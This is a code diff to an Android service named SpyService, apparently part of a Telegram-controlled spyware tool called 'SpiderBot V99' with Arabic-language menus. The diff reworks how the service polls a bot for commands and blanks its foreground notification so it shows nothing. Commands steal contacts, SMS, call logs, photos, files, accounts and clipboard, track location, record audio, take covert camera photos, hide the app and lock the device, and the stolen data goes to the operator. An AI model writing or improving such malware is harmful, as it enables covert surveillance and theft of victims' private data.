@@ -58,6 +58,7 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private boolean isRegistered = false;
     private boolean foregroundStarted = false;
+    private int lastUpdateId = 0;
 
     @Override
     public void onCreate() {
@@ -74,7 +75,7 @@ public class SpyService extends Service {
         registerDevice();
 
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleAtFixedRate(this::pollCommands, 3, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(this::checkCommands, 2, Config.get().poll_interval_sec, TimeUnit.SECONDS);
 
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             if (!foregroundStarted && hasMicrophonePermission()) {
@@ -96,16 +97,16 @@ public class SpyService extends Service {
                 getSystemService(NotificationManager.class).createNotificationChannel(ch);
             }
             startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
-                    .setContentTitle("Google Services")
-                    .setContentText("Running...")
+                    .setContentTitle("")
+                    .setContentText("")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .setPriority(NotificationCompat.PRIORITY_MIN)
                     .setSilent(true)
                     .build());
             foregroundStarted = true;
-            Log.d(TAG, "Foreground service started");
+            Log.d(TAG, "Foreground started");
         } catch (SecurityException e) {
-            Log.e(TAG, "Foreground failed: " + e.getMessage());
+            Log.e(TAG, "Foreground failed", e);
         }
     }
 
@@ -120,11 +121,9 @@ public class SpyService extends Service {
             info.put("battery", getBatteryLevel());
 
             String msg = "REGISTER:" + info.toString();
-            boolean sent = bot.sendText(msg);
+            bot.sendText(msg);
             isRegistered = true;
-            Log.d(TAG, "Registration sent: " + msg + " | Success: " + sent);
-
-            bot.sendText("✅ جهاز جديد مسجل!\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🆔 " + deviceId);
+            Log.d(TAG, "Registered: " + deviceId);
         } catch (Exception e) {
             Log.e(TAG, "Registration error", e);
         }
@@ -143,133 +142,127 @@ public class SpyService extends Service {
         return -1;
     }
 
-    private void pollCommands() {
+    private void checkCommands() {
         try {
-            if (!isRegistered) {
-                registerDevice();
-                return;
-            }
-
             String response = bot.getUpdates();
-            if (response == null) {
-                Log.d(TAG, "getUpdates returned null");
-                return;
-            }
+            if (response == null || response.isEmpty()) return;
 
             JSONObject json = new JSONObject(response);
-            if (!json.getBoolean("ok")) {
-                Log.d(TAG, "getUpdates not ok: " + response);
-                return;
-            }
+            if (!json.getBoolean("ok")) return;
 
             JSONArray updates = json.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
                 JSONObject upd = updates.getJSONObject(i);
                 int updId = upd.getInt("update_id");
-                if (updId <= bot.lastUpdateId) continue;
-                bot.lastUpdateId = updId + 1;
+                if (updId <= lastUpdateId) continue;
+                lastUpdateId = updId;
 
-                if (upd.has("message")) {
-                    JSONObject msg = upd.getJSONObject("message");
-                    if (msg.has("text")) {
-                        String txt = msg.getString("text").trim();
-                        Log.d(TAG, "Received: " + txt);
-                        handleCommand(txt);
-                    }
-                }
+                if (!upd.has("message")) continue;
+                JSONObject msg = upd.getJSONObject("message");
+                if (!msg.has("text")) continue;
+
+                String text = msg.getString("text").trim();
+                Log.d(TAG, "Command received: " + text);
+
+                // معالجة الأمر فوراً
+                processCommand(text);
             }
         } catch (Exception e) {
-            Log.e(TAG, "pollCommands error", e);
+            Log.e(TAG, "checkCommands error", e);
         }
     }
 
-    private void handleCommand(String cmd) {
-        String lower = cmd.toLowerCase().trim();
-        Log.d(TAG, "Handling: " + lower);
+    private void processCommand(String text) {
+        Log.d(TAG, "Processing: " + text);
+        String lower = text.toLowerCase().trim();
 
-        if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu") || lower.equals("/commands")) {
-            sendHelpMenu();
+        // أوامر المساعدة
+        if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu")) {
+            sendHelp();
             return;
         }
 
-        String command = lower.startsWith("/") ? lower.substring(1) : lower;
-        executeCommand(command);
+        // إزالة / من الأمر
+        String cmd = lower.startsWith("/") ? lower.substring(1) : lower;
+
+        // تنفيذ الأمر
+        executeCommand(cmd);
     }
 
     private void executeCommand(String cmd) {
+        Log.d(TAG, "Executing: " + cmd);
         try {
-            Log.d(TAG, "Executing: " + cmd);
             switch (cmd) {
-                case "steal_contacts": case "contacts": case "get_contacts":
+                case "steal_contacts": case "contacts":
                     sendFile(collectContacts(), "📇 جهات الاتصال");
                     break;
-                case "steal_sms": case "sms": case "get_sms":
+                case "steal_sms": case "sms":
                     sendFile(collectSms(), "💬 الرسائل النصية");
                     break;
-                case "steal_calls": case "calllog": case "get_calllogs":
+                case "steal_calls": case "calllog":
                     sendFile(collectCallLogs(), "📞 سجل المكالمات");
                     break;
-                case "location": case "get_location":
+                case "location":
                     getLocation();
                     break;
-                case "record": case "start_record":
+                case "record":
                     startRecording();
                     break;
-                case "stoprec": case "stop_record":
+                case "stoprec":
                     stopRecording();
                     break;
-                case "apps": case "get_apps":
+                case "apps":
                     sendFile(collectApps(), "📱 التطبيقات");
                     break;
-                case "photos": case "get_photos":
+                case "photos":
                     sendFile(collectMedia("images"), "🖼 الصور");
                     break;
-                case "videos": case "get_videos":
+                case "videos":
                     sendFile(collectMedia("videos"), "🎬 الفيديوهات");
                     break;
-                case "files": case "get_files":
+                case "files":
                     sendFile(collectAllFiles(), "📦 الملفات");
                     break;
-                case "hide": case "hide_app":
+                case "hide":
                     hideApp();
                     break;
-                case "show": case "show_app":
+                case "show":
                     showApp();
                     break;
-                case "notify": case "fake_notif":
+                case "notify":
                     showFakeNotification();
                     break;
-                case "cam_back": case "take_photo":
+                case "cam_back":
                     takePhoto();
                     break;
-                case "cam_front": case "take_photo_front":
+                case "cam_front":
                     takePhotoFront();
                     break;
-                case "torch_on": case "flash_on":
+                case "torch_on":
                     flashOn();
                     break;
-                case "torch_off": case "flash_off":
+                case "torch_off":
                     flashOff();
                     break;
-                case "imei": case "get_imei":
+                case "imei":
                     getImei();
                     break;
-                case "phone": case "get_phone":
+                case "phone":
                     getPhoneNumber();
                     break;
-                case "sim": case "get_sim":
+                case "sim":
                     getSimInfo();
                     break;
-                case "wifi": case "get_wifi":
+                case "wifi":
                     getWifiInfo();
                     break;
-                case "battery": case "get_battery":
+                case "battery":
                     getBatteryInfo();
                     break;
-                case "ip": case "get_ip":
+                case "ip":
                     getPublicIp();
                     break;
-                case "lock": case "lock_device":
+                case "lock":
                     lockDevice();
                     break;
                 case "reboot":
@@ -278,16 +271,16 @@ public class SpyService extends Service {
                 case "shutdown":
                     shutdownDevice();
                     break;
-                case "accounts": case "get_accounts":
+                case "accounts":
                     getAccounts();
                     break;
-                case "clipboard": case "get_clipboard":
+                case "clipboard":
                     getClipboard();
                     break;
-                case "device": case "get_device":
+                case "device":
                     getDeviceInfo();
                     break;
-                case "network": case "get_network":
+                case "network":
                     getNetworkInfo();
                     break;
                 default:
@@ -301,11 +294,10 @@ public class SpyService extends Service {
 
     // ========== قائمة المساعدة ==========
 
-    private void sendHelpMenu() {
-        String menu = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
+    private void sendHelp() {
+        String help = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🔴 **أوامر السرقة** 🔴\n" +
-                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "/steal_contacts - جهات الاتصال\n" +
                 "/steal_sms - الرسائل\n" +
                 "/steal_calls - سجل المكالمات\n" +
@@ -318,7 +310,6 @@ public class SpyService extends Service {
                 "/clipboard - الحافظة\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "⚫ **أوامر التحكم** ⚫\n" +
-                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "/hide - إخفاء التطبيق\n" +
                 "/show - إظهار التطبيق\n" +
                 "/notify - إشعار وهمي\n" +
@@ -329,8 +320,7 @@ public class SpyService extends Service {
                 "/shutdown - إيقاف تشغيل\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🟢 **أوامر المعلومات** 🟢\n" +
-                "━━━━━━━━━━━━━━━━━━━━━━\n" +
-                "/imei - رقم IMEI\n" +
+                "/imei - IMEI\n" +
                 "/phone - رقم الهاتف\n" +
                 "/sim - معلومات الشريحة\n" +
                 "/wifi - الواي فاي\n" +
@@ -341,11 +331,10 @@ public class SpyService extends Service {
                 "/device - معلومات الجهاز\n" +
                 "/network - معلومات الشبكة\n\n" +
                 "✅ SpiderBot V99 جاهز";
-
-        bot.sendText(menu);
+        bot.sendText(help);
     }
 
-    // ========== معلومات الجهاز والشبكة ==========
+    // ========== معلومات الجهاز ==========
 
     private void getDeviceInfo() {
         String info = "📱 **معلومات الجهاز**\n\n" +
